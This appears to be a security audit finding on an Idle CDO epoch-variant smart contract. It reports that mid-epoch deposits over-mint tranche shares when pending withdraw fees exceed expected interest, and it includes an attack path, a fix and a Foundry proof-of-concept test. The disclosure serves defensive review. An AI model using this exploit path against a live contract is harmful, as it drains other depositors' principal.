### Title
`depositDuringEpoch` over-mints discounted shares when `pendingWithdrawFees >= expectedEpochInterest`, letting a depositor mint unbacked interest-bearing shares - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
`IdleCDOEpochVariant.depositDuringEpoch` prices mid-epoch deposits as `minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal`. When `pendingWithdrawFees >= expectedEpochInterest`, `trancheExpected` is correctly zeroed, but `expectedFinal` collapses to bare `lastNAV` while the numerator still adds the depositor's own projected `trancheInterest`. The depositor receives `trancheInterest`-worth of extra tranche tokens that are never backed by future gains, diluting every other holder's principal at epoch settlement. This mirrors the CVE bug class: an unvalidated degenerate branch of a computed value (`trancheExpected`/`expectedFinal`) produces an out-of-bounds share allocation.

### Finding Description
In `depositDuringEpoch` (contracts/IdleCDOEpochVariant.sol:656-733):

```solidity
uint256 expectedInt = expectedEpochInterest;
uint256 pendingFees = pendingWithdrawFees;
uint256 trancheExpected;
if (expectedInt > pendingFees) {
  trancheExpected = _calcTrancheInterestShare(
    _netGainAfterFees(expectedInt - pendingFees, _calculateManagementFee(...)),
    _tranche
  );
}
uint256 trancheInterest = _calcTrancheInterestShare(_netGainAfterFees(interest, ...), _tranche);
uint256 expectedFinal = _lastSavedNAV(_tranche) + trancheExpected;
_minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal;
```

`trancheExpected` represents existing holders' claim on *net* epoch interest. When pending withdraw-request fees consume all (or more than all) of `expectedEpochInterest`, the honest outcome is that the tranche earns ~zero net interest — meaning a fair mid-epoch mint is `_amount * supply / lastNAV` (par). Instead the numerator still adds `trancheInterest` (the depositor's own projected share, computed on gross `interest` net of fees only), so the minted amount is inflated by roughly `trancheInterest / lastNAV * supply`. That surplus is paid out of NAV at `stopEpoch`/`_updateAccounting`, i.e. out of other holders' principal.

Reachability of the precondition is attacker-controlled: `pendingWithdrawFees` is incremented by `_totalWithdrawFees(principal, interest)` on every `requestWithdraw` (line 774-778), and `_totalWithdrawFees` includes an upfront management fee on *principal* over `epochDuration + remaining buffer` (`_withdrawRequestManagementFeeDuration`, lines 900-931). With `managementFee > 0` (a legitimate honest-manager config, e.g. 1% APR-equivalent), a lender who deposited a large position during the buffer can `requestWithdraw` it mid-epoch, pushing `pendingWithdrawFees` above `expectedEpochInterest`. A second attacker wallet (KYC-passed, `isDepositDuringEpochDisabled == false`) then calls `depositDuringEpoch` and receives the inflated mint.

The dev team anticipated the numeric branch but only with a forced-storage test (`testDepositDuringEpochHandlesPendingFeesGtExpected` uses `stdstore` to set `pendingWithdrawFees = 1`, `expectedEpochInterest = 0`), i.e. the natural path via large management-fee-bearing withdraw requests was not exercised.

### Impact Explanation
Direct theft/dilution: the depositor redeems `minted * price` where `minted` exceeds the fair amount by ≈ `trancheInterest * supply / lastNAV`. Since in this state the tranche's net epoch gain is zero, the excess is paid from other holders' principal, breaking the fair-mint invariant (`deposit == share of NAV`). Quantified example: `lastNAV = 1000e6`, `supply = 1000e18`, deposit `1000e6` with `trancheInterest = 50e6` → `minted = 1050e18` vs fair `1000e18`; at settlement the depositor withdraws ~5% more than deposited, stolen pro-rata from existing holders. Loss scales with deposit size and the tranche's APR share.

### Likelihood Explanation
Requires: (a) `isDepositDuringEpochDisabled == false` (owner-enabled feature), (b) `managementFee > 0` or sufficiently large performance fees so that an attacker's large mid-epoch withdraw request can push `pendingWithdrawFees >= expectedEpochInterest`, (c) an epoch running with `block.timestamp < epochEndDate`. All actors are unprivileged (depositors, withdraw requesters); no privileged misbehavior needed. Medium likelihood gated on fee configuration.

### Recommendation
When `expectedInt <= pendingFees`, treat the deposit as par-priced: set `trancheInterest = 0` as well (or require `expectedFinal` to include the depositor's own interest only against a non-zero `trancheExpected`). More robustly, compute `minted = _amount * _trancheTotSupply / expectedFinal` and accrue the depositor's interest through `lastNAV`/`expectedEpochInterest` growth, or simply revert mid-epoch deposits when `expectedEpochInterest <= pendingWithdrawFees`.

### Proof of Concept
```solidity
// Foundry fork-style test sketch (test/foundry/IdleCreditVault.t.sol harness)
function testDepositDuringEpochOverMintWhenPendingFeesExceedExpected() external {
    // manager (honest): 10% apr epoch, managementFee 1% (rate units per repo)
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(365 days, 365 days); // buffer doubles mgmt-fee duration
    IdleCreditVault(address(strategy)).setAprs(10e18, _scaleAprWithBuffer(10e18));
    vm.stopPrank();
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, mgmtFeeRate); // mgmtFeeRate = e.g. 1_000

    uint256 big = 1_000_000 * ONE_SCALE;
    address whale = makeAddr('whale');
    deal(defaultUnderlying, whale, big);
    _depositWithUser(whale, big);                 // buffer deposit
    idleCDO.depositAA(1000 * ONE_SCALE);          // victim

    _startEpochAndCheckPrices(0);

    // whale requests withdraw mid-epoch: upfront mgmt fee on principal over
    // epochDuration + remaining buffer exceeds expectedEpochInterest
    vm.prank(whale);
    cdoEpoch.requestWithdraw(0, address(AAtranche));
    assertGt(cdoEpoch.pendingWithdrawFees(), cdoEpoch.expectedEpochInterest());

    vm.prank(owner);
    cdoEpoch.setIsDepositDuringEpochDisabled(false);

    address attacker = makeAddr('attacker');
    uint256 dep = 1000 * ONE_SCALE;
    deal(defaultUnderlying, attacker, dep);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), dep);
    uint256 minted = cdoEpoch.depositDuringEpoch(dep, address(AAtranche));
    vm.stopPrank();

    // Fair mint (par, since tranche nets ~0 interest) is dep * supply / lastNAV
    uint256 supply = IERC20(address(AAtranche)).totalSupply() - minted;
    uint256 fair = dep * supply / cdoEpoch.lastNAVAA() / 1; // approx, pre-add
    assertGt(minted, fair);                                 // over-minted

    _toggleEpoch(false, initialProvidedApr, _expectedFundsEndEpoch());
    uint256 price = cdoEpoch.virtualPrice(address(AAtranche));
    assertGt(minted * price / ONE_TRANCHE_TOKEN, dep);      // attacker profits at victims' expense
}
```